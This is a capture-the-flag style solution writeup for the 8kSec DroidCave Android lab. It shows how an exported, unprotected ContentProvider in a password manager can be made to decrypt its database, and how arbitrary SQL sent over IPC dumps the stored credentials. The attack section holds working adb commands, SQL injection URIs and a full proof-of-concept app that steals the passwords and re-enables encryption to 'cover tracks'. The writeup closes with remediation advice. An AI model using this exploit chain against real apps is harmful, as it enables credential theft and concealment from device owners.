# 8kSec DroidCave — Secure Password Management
## Solution Writeup & Payloads ✅ (Approved)

> **Target:** DroidCave password manager (8kSec Android lab)
> **Objective:** Exploit an exposed `ContentProvider` to decrypt and exfiltrate stored credentials
> **Difficulty focus:** IPC exposure · SQL injection · broken crypto design
> **Author notes:** Solution path verified against the public writeup (lautarovculic.github.io)

> Companion solver: [droidcave_payload.sh](droidcave_payload.sh) — automates the full
> chain (auto-detects package/authority/user, URL-encodes the SQLi payload, saves loot
> to a timestamped file).

---

## 1. Tools

| Tool | Purpose |
|---|---|
| `adb` | install APK + drive the provider from the host |
| `JADX` | static analysis of the decompiled code |
| Android Studio *(optional)* | build the PoC exploit app (real IPC) |

Install the lab app:

```bash
adb install -r DroidCave.apk
```

Open the app once and store a few passwords so there is data to steal.

---

## 2. Recon — Static Analysis (JADX)

### 2.1 AndroidManifest.xml — the root flaw

```xml
<provider
    android:name=".PasswordContentProvider"
    android:authorities="com.eightksec.droidcave.provider"
    android:exported="true" />   <!-- no android:permission attribute! -->
```

- `exported="true"` → reachable by **any** third-party app via IPC.
- **No `android:permission`** → zero authentication gate.

### 2.2 UriMatcher endpoints (`PasswordContentProvider` static block)

| Code | Path | Purpose | Risk |
|---|---|---|---|
| 1 | `passwords` | list all entries | data exposure |
| 2 | `passwords/#` | single entry by id | data exposure |
| 3 | `password_search/*` | search | data exposure |
| 4 | `password_type/*` | filter by type | data exposure |
| **5** | **`execute_sql/*`** | **executes last segment verbatim as SQL** | **arbitrary SQLi** |
| 6 | `settings/*` | `get_<key>` / `set_key=value` | config tampering |
| **7** | **`disable_encryption`** | **decrypts every row in place** | crypto bypass |
| 8 | `enable_encryption` | re-encrypts all rows | (restore state) |
| 9 | `set_password_plaintext/*/*` | write plaintext entry | tampering |

### 2.3 The crypto design flaw

- `disable_encryption` sets `SharedPreferences` key `encryption_enabled = false`, then iterates **all** rows, decrypts each BLOB, and rewrites it as plaintext with `isEncrypted = 0`.
- One single IPC call ⇒ the **entire database becomes cleartext**.
- SQL errors from `execute_sql` are returned in an `error` column (handy for blind extraction).

---

## 3. Pre-flight Checks (run these first)

If you get `Could not find provider`, the authority isn't visible to your shell user:

```bash
# Is the app installed at all?
adb shell pm list packages | grep -iE "droidcave|eightksec"

# Find the REAL authority + which user hosts it
adb shell dumpsys package providers | grep -iE "droidcave|eightksec" -A 3

# If the app lives under another user (labs often use user 10):
adb shell content query --user 10 --uri content://<REAL_AUTHORITY>/passwords
```

> `Could not find provider` = authority not registered for *your* user.
> `SecurityException` = authority found but access denied (different problem).
> Always copy the authority **verbatim** from `dumpsys` output.

---

## 4. Attack Chain — Payloads

### 4.1 Method A — `adb shell` (fast path)

```bash
# [1] Decrypt the whole DB (one IPC call)
adb shell content query --uri content://com.eightksec.droidcave.provider/disable_encryption

# [2] Dump everything — password column is now plaintext ASCII, no SQL needed
adb shell content query --uri content://com.eightksec.droidcave.provider/passwords

# [3] (optional) Cover tracks
adb shell content query --uri content://com.eightksec.droidcave.provider/enable_encryption
```

### 4.2 Method A+ — proving the SQLi via `execute_sql`

⚠️ **Quoting trap:** quotes are consumed by your *local* shell; Android's `mksh`
then sees raw `(` and spaces → `syntax error: unexpected '('`.
Two working fixes:

**Fix 1 — double quoting (quote the whole remote command):**

```bash
adb shell "content query --uri 'content://com.eightksec.droidcave.provider/execute_sql/SELECT id,name,username,CAST(password AS TEXT) AS pass FROM passwords'"
```

**Fix 2 — URL-encoding (no special chars reach the remote shell):**

```bash
adb shell content query --uri "content://com.eightksec.droidcave.provider/execute_sql/SELECT%20id,name,username,CAST%28password%20AS%20TEXT%29%20AS%20pass%20FROM%20passwords"
```

Android's `Uri` decodes `%20 / %28 / %29` automatically, so the provider receives
real spaces and parens in `getLastPathSegment()`.

> `CAST(password AS TEXT)` is required — the column is stored as a **BLOB**;
> without the cast you get unreadable bytes.

### 4.3 Method B — PoC exploit app (real-world IPC)

A minimal app with one button. Demonstrates what *any* installed app could do.

**`AndroidManifest.xml`** — `<queries>` required on Android 11+ for package visibility:

```xml
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.poc.droidexploit">

    <queries>
        <package android:name="com.eightksec.droidcave" />
        <provider android:authorities="com.eightksec.droidcave.provider" />
    </queries>

    <application android:label="DroidExploit" android:allowBackup="false">
        <activity android:name=".MainActivity" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
    </application>
</manifest>
```

**`res/layout/activity_main.xml`** — one centered button:

```xml
<?xml version="1.0" encoding="utf-8"?>
<FrameLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent" android:layout_height="match_parent">

    <Button
        android:id="@+id/btn_steal"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_gravity="center"
        android:text="Steal Secrets" />
</FrameLayout>
```

**`MainActivity.java`** — the full chain: decrypt → dump via SQLi → re-encrypt:

```java
package com.poc.droidexploit;

import android.app.Activity;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;

public class MainActivity extends Activity {

    private static final String TAG = "STEALER";
    private static final String AUTHORITY = "com.eightksec.droidcave.provider";
    private static final Uri BASE = Uri.parse("content://" + AUTHORITY);

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        findViewById(R.id.btn_steal).setOnClickListener(v ->
                new Thread(this::stealSecrets).start());
    }

    private void stealSecrets() {
        try {
            // 1) Decrypt the entire DB in place
            getContentResolver().query(
                    Uri.withAppendedPath(BASE, "disable_encryption"),
                    null, null, null, null);

            // 2) Exfiltrate via the raw-SQL endpoint
            String sql = "SELECT id, name, username, "
                    + "CAST(password AS TEXT) AS pass FROM passwords";
            Uri sqlUri = Uri.withAppendedPath(
                    Uri.withAppendedPath(BASE, "execute_sql"),
                    Uri.encode(sql));               // encodes spaces + parens safely

            Cursor c = getContentResolver().query(sqlUri, null, null, null, null);
            if (c != null) {
                while (c.moveToNext()) {
                    StringBuilder row = new StringBuilder();
                    for (int i = 0; i < c.getColumnCount(); i++) {
                        row.append(c.getColumnName(i)).append('=')
                           .append(c.getString(i)).append(" | ");
                    }
                    Log.d(TAG, row.toString());
                }
                c.close();
            }

            // 3) Cover tracks — restore encryption
            getContentResolver().query(
                    Uri.withAppendedPath(BASE, "enable_encryption"),
                    null, null, null, null);
        } catch (Exception e) {
            Log.e(TAG, "stealSecrets failed", e);
        }
    }
}
```

Build, install on the same device, tap the button, read the loot:

```bash
adb install -r DroidExploit.apk
adb logcat -s STEALER
```

---

## 5. Expected Result

- No hard-coded flag in this lab — the **loot is the stored credentials**,
  printed as plaintext rows (`id | name | username | pass`).
- After step 3 the DB is re-encrypted; the victim sees no difference.

---

## 6. Lessons / Remediation

| # | Weakness | Fix |
|---|---|---|
| 1 | Exported provider without permission | `exported="false"` + signature-level `android:permission` |
| 2 | `execute_sql` raw endpoint | **Never** expose SQL over IPC; whitelist fixed queries server-side of the provider |
| 3 | Externally toggleable encryption | Crypto state/key must never be IPC-controllable; encrypt at the field level with keys in Android Keystore |

**Takeaway:** an exported provider is a public API surface. Treat every IPC
caller as hostile, and never let a security control (encryption on/off) be
flippable through it.

---

## 7. Troubleshooting Cheatsheet

| Symptom | Cause | Fix |
|---|---|---|
| `Could not find provider: com.eightksec.droidcave.provider` | app not installed, or hosted under another Android user | `pm list packages`, `dumpsys package providers`, add `--user N` |
| `syntax error: unexpected '('` | quotes stripped locally; Android `mksh` chokes on parens | double-quote the remote command **or** URL-encode (`%28 %29 %20`) |
| `pass` column looks like garbage | BLOB not cast | add `CAST(password AS TEXT) AS pass` |
| SQL error row returned | provider wraps errors in `error` column | read the `error` column to refine your query |
